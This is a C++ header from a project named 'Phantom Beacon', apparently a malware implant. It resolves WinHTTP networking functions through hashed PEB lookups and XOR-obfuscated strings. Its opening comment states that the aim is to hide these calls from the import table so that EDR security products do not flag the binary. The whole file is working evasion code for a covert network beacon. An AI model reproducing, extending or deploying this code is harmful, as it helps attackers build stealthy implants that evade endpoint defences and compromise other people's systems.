#pragma once
// ============================================================================
//  winhttp_dynamic.h — Phantom Beacon Dynamic WinHTTP Resolution
//  ───────────────────────────────────────────────────────────────────
//  Resolves all WinHTTP functions via PEB hash lookup instead of
//  linking winhttp.lib. This eliminates IAT entries that EDRs use
//  to flag suspicious binaries calling WinHttpOpen from non-browser
//  processes.
//
//  WinHTTP functions resolved:
//    WinHttpOpen, WinHttpConnect, WinHttpOpenRequest,
//    WinHttpSendRequest, WinHttpReceiveResponse, WinHttpQueryDataAvailable,
//    WinHttpReadData, WinHttpWriteData, WinHttpCloseHandle,
//    WinHttpSetOption, WinHttpSetTimeouts
// ============================================================================

#ifdef _WIN32
#include <windows.h>
#include <winhttp.h>
#include "evasion.h"

namespace winhttp_dyn {

// ── Pre-computed djb2 hashes for WinHTTP functions ─────────────────────────
constexpr uint32_t FN_WINHTTPOPEN              = 0x3C1082C3;  // WinHttpOpen
constexpr uint32_t FN_WINHTTPCONNECT           = 0x2C58C59B;  // WinHttpConnect
constexpr uint32_t FN_WINHTTPOPENREQUEST       = 0x0A4E9CEC;  // WinHttpOpenRequest
constexpr uint32_t FN_WINHTTPSENDREQUEST       = 0xD11ADDC4;  // WinHttpSendRequest
constexpr uint32_t FN_WINHTTPRECEIVERESPONSE   = 0x1CDB8B43;  // WinHttpReceiveResponse
constexpr uint32_t FN_WINHTTPQUERYDATAAVAILABLE = 0x3F1BFBE2; // WinHttpQueryDataAvailable
constexpr uint32_t FN_WINHTTPREADDATA          = 0x6E6C6CC7;  // WinHttpReadData
constexpr uint32_t FN_WINHTTPWRITEDATA         = 0x11296DD6;  // WinHttpWriteData
constexpr uint32_t FN_WINHTTPCLOSEHANDLE       = 0x55B8EFF3;  // WinHttpCloseHandle
constexpr uint32_t FN_WINHTTPSETOPTION         = 0x39331896;  // WinHttpSetOption
constexpr uint32_t FN_WINHTTPSETTIMEOUTS       = 0xC430C3F7;  // WinHttpSetTimeouts

// ── Function pointer typedefs ──────────────────────────────────────────────
typedef HINTERNET (WINAPI *PFN_WinHttpOpen)(
    LPCWSTR pszAgentW, DWORD dwAccessType,
    LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags);
typedef HINTERNET (WINAPI *PFN_WinHttpConnect)(
    HINTERNET hSession, LPCWSTR pswzServerName,
    INTERNET_PORT nServerPort, DWORD dwReserved);
typedef HINTERNET (WINAPI *PFN_WinHttpOpenRequest)(
    HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName,
    LPCWSTR pwszVersion, LPCWSTR pwszReferrer,
    LPCWSTR const* ppwszAcceptTypes, DWORD dwFlags);
typedef BOOL (WINAPI *PFN_WinHttpSendRequest)(
    HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength,
    LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength,
    DWORD_PTR dwContext);
typedef BOOL (WINAPI *PFN_WinHttpReceiveResponse)(
    HINTERNET hRequest, LPVOID lpReserved);
typedef BOOL (WINAPI *PFN_WinHttpQueryDataAvailable)(
    HINTERNET hRequest, LPDWORD lpdwNumberOfBytesAvailable);
typedef BOOL (WINAPI *PFN_WinHttpReadData)(
    HINTERNET hRequest, LPVOID lpBuffer,
    DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
typedef BOOL (WINAPI *PFN_WinHttpWriteData)(
    HINTERNET hRequest, LPCVOID lpBuffer,
    DWORD dwNumberOfBytesToWrite, LPDWORD lpdwNumberOfBytesWritten);
typedef BOOL (WINAPI *PFN_WinHttpCloseHandle)(HINTERNET hInternet);
typedef BOOL (WINAPI *PFN_WinHttpSetOption)(
    HINTERNET hInternet, DWORD dwOption,
    LPVOID lpBuffer, DWORD dwBufferLength);
typedef BOOL (WINAPI *PFN_WinHttpSetTimeouts)(
    HINTERNET hInternet, int nResolveTimeout,
    int nConnectTimeout, int nSendTimeout, int nReceiveTimeout);

// ── Resolved function table (populated on first use) ───────────────────────
struct WinHttpTable {
    PFN_WinHttpOpen                pfnOpen = nullptr;
    PFN_WinHttpConnect             pfnConnect = nullptr;
    PFN_WinHttpOpenRequest         pfnOpenRequest = nullptr;
    PFN_WinHttpSendRequest         pfnSendRequest = nullptr;
    PFN_WinHttpReceiveResponse     pfnReceiveResponse = nullptr;
    PFN_WinHttpQueryDataAvailable  pfnQueryDataAvailable = nullptr;
    PFN_WinHttpReadData            pfnReadData = nullptr;
    PFN_WinHttpWriteData           pfnWriteData = nullptr;
    PFN_WinHttpCloseHandle         pfnCloseHandle = nullptr;
    PFN_WinHttpSetOption           pfnSetOption = nullptr;
    PFN_WinHttpSetTimeouts         pfnSetTimeouts = nullptr;
    bool                           resolved = false;

    bool resolve() {
        if (resolved) return true;

        // Load winhttp.dll dynamically (no static import!)
        HMODULE hWinHttp = peb::GetModuleByHash(peb::HASH_WINHTTP);
        if (!hWinHttp) {
            // Fallback: try LoadLibraryA via PEB
            auto pLoadLibraryA = (HMODULE(WINAPI*)(LPCSTR))
                peb::Resolve(peb::HASH_KERNEL32, FN_LOADLIBRARYA);
            if (!pLoadLibraryA) return false;

            auto winhttp_name = XOR_DEC(XOR_STR("winhttp.dll"));
            hWinHttp = pLoadLibraryA(winhttp_name.c_str());
        }
        if (!hWinHttp) return false;

        pfnOpen              = (PFN_WinHttpOpen)              peb::GetProcByHash(hWinHttp, FN_WINHTTPOPEN);
        pfnConnect           = (PFN_WinHttpConnect)           peb::GetProcByHash(hWinHttp, FN_WINHTTPCONNECT);
        pfnOpenRequest       = (PFN_WinHttpOpenRequest)       peb::GetProcByHash(hWinHttp, FN_WINHTTPOPENREQUEST);
        pfnSendRequest       = (PFN_WinHttpSendRequest)       peb::GetProcByHash(hWinHttp, FN_WINHTTPSENDREQUEST);
        pfnReceiveResponse   = (PFN_WinHttpReceiveResponse)   peb::GetProcByHash(hWinHttp, FN_WINHTTPRECEIVERESPONSE);
        pfnQueryDataAvailable = (PFN_WinHttpQueryDataAvailable) peb::GetProcByHash(hWinHttp, FN_WINHTTPQUERYDATAAVAILABLE);
        pfnReadData          = (PFN_WinHttpReadData)          peb::GetProcByHash(hWinHttp, FN_WINHTTPREADDATA);
        pfnWriteData         = (PFN_WinHttpWriteData)         peb::GetProcByHash(hWinHttp, FN_WINHTTPWRITEDATA);
        pfnCloseHandle       = (PFN_WinHttpCloseHandle)       peb::GetProcByHash(hWinHttp, FN_WINHTTPCLOSEHANDLE);
        pfnSetOption         = (PFN_WinHttpSetOption)         peb::GetProcByHash(hWinHttp, FN_WINHTTPSETOPTION);
        pfnSetTimeouts       = (PFN_WinHttpSetTimeouts)       peb::GetProcByHash(hWinHttp, FN_WINHTTPSETTIMEOUTS);

        resolved = (pfnOpen && pfnConnect && pfnOpenRequest &&
                    pfnSendRequest && pfnReceiveResponse &&
                    pfnQueryDataAvailable && pfnReadData &&
                    pfnWriteData && pfnCloseHandle);
        return resolved;
    }
};

/// Get the global WinHTTP function table (thread-safe lazy init).
inline WinHttpTable& get_winhttp() {
    static WinHttpTable table;
    table.resolve();
    return table;
}

// ── Inline wrappers that use the dynamic table ─────────────────────────────

inline HINTERNET WinHttpOpenDynamic(
    LPCWSTR pszAgentW, DWORD dwAccessType,
    LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags)
{
    auto& t = get_winhttp();
    if (!t.pfnOpen) return nullptr;
    return t.pfnOpen(pszAgentW, dwAccessType, pszProxyW, pszProxyBypassW, dwFlags);
}

inline HINTERNET WinHttpConnectDynamic(
    HINTERNET hSession, LPCWSTR pswzServerName,
    INTERNET_PORT nServerPort, DWORD dwReserved)
{
    auto& t = get_winhttp();
    if (!t.pfnConnect) return nullptr;
    return t.pfnConnect(hSession, pswzServerName, nServerPort, dwReserved);
}

inline HINTERNET WinHttpOpenRequestDynamic(
    HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName,
    LPCWSTR pwszVersion, LPCWSTR pwszReferrer,
    LPCWSTR const* ppwszAcceptTypes, DWORD dwFlags)
{
    auto& t = get_winhttp();
    if (!t.pfnOpenRequest) return nullptr;
    return t.pfnOpenRequest(hConnect, pwszVerb, pwszObjectName,
        pwszVersion, pwszReferrer, ppwszAcceptTypes, dwFlags);
}

inline BOOL WinHttpSendRequestDynamic(
    HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength,
    LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength,
    DWORD_PTR dwContext)
{
    auto& t = get_winhttp();
    if (!t.pfnSendRequest) return FALSE;
    return t.pfnSendRequest(hRequest, lpszHeaders, dwHeadersLength,
        lpOptional, dwOptionalLength, dwTotalLength, dwContext);
}

inline BOOL WinHttpReceiveResponseDynamic(
    HINTERNET hRequest, LPVOID lpReserved)
{
    auto& t = get_winhttp();
    if (!t.pfnReceiveResponse) return FALSE;
    return t.pfnReceiveResponse(hRequest, lpReserved);
}

inline BOOL WinHttpQueryDataAvailableDynamic(
    HINTERNET hRequest, LPDWORD lpdwNumberOfBytesAvailable)
{
    auto& t = get_winhttp();
    if (!t.pfnQueryDataAvailable) return FALSE;
    return t.pfnQueryDataAvailable(hRequest, lpdwNumberOfBytesAvailable);
}

inline BOOL WinHttpReadDataDynamic(
    HINTERNET hRequest, LPVOID lpBuffer,
    DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead)
{
    auto& t = get_winhttp();
    if (!t.pfnReadData) return FALSE;
    return t.pfnReadData(hRequest, lpBuffer,
        dwNumberOfBytesToRead, lpdwNumberOfBytesRead);
}

inline BOOL WinHttpWriteDataDynamic(
    HINTERNET hRequest, LPCVOID lpBuffer,
    DWORD dwNumberOfBytesToWrite, LPDWORD lpdwNumberOfBytesWritten)
{
    auto& t = get_winhttp();
    if (!t.pfnWriteData) return FALSE;
    return t.pfnWriteData(hRequest, lpBuffer,
        dwNumberOfBytesToWrite, lpdwNumberOfBytesWritten);
}

inline BOOL WinHttpCloseHandleDynamic(HINTERNET hInternet)
{
    auto& t = get_winhttp();
    if (!t.pfnCloseHandle) return FALSE;
    return t.pfnCloseHandle(hInternet);
}

inline BOOL WinHttpSetOptionDynamic(
    HINTERNET hInternet, DWORD dwOption,
    LPVOID lpBuffer, DWORD dwBufferLength)
{
    auto& t = get_winhttp();
    if (!t.pfnSetOption) return FALSE;
    return t.pfnSetOption(hInternet, dwOption, lpBuffer, dwBufferLength);
}

inline BOOL WinHttpSetTimeoutsDynamic(
    HINTERNET hInternet, int nResolveTimeout,
    int nConnectTimeout, int nSendTimeout, int nReceiveTimeout)
{
    auto& t = get_winhttp();
    if (!t.pfnSetTimeouts) return FALSE;
    return t.pfnSetTimeouts(hInternet, nResolveTimeout,
        nConnectTimeout, nSendTimeout, nReceiveTimeout);
}

// WinHttpQueryOption — used for mTLS server cert pinning
typedef BOOL (WINAPI *PFN_WinHttpQueryOption)(
    HINTERNET hInternet, DWORD dwOption,
    LPVOID lpBuffer, LPDWORD lpdwBufferLength);

inline BOOL WinHttpQueryOptionDynamic(
    HINTERNET hInternet, DWORD dwOption,
    LPVOID lpBuffer, LPDWORD lpdwBufferLength)
{
    auto& t = get_winhttp();
    // Resolve QueryOption lazily (not stored in table — used only for mTLS)
    static PFN_WinHttpQueryOption pfnQueryOption = nullptr;
    if (!pfnQueryOption) {
        HMODULE hWinHttp = peb::GetModuleByHash(peb::HASH_WINHTTP);
        if (hWinHttp) {
            pfnQueryOption = (PFN_WinHttpQueryOption)
                peb::GetProcByHash(hWinHttp, 0x60FF5FC0);  // WinHttpQueryOption
        }
    }
    if (!pfnQueryOption) return FALSE;
    return pfnQueryOption(hInternet, dwOption, lpBuffer, lpdwBufferLength);
}

}  // namespace winhttp_dyn
#endif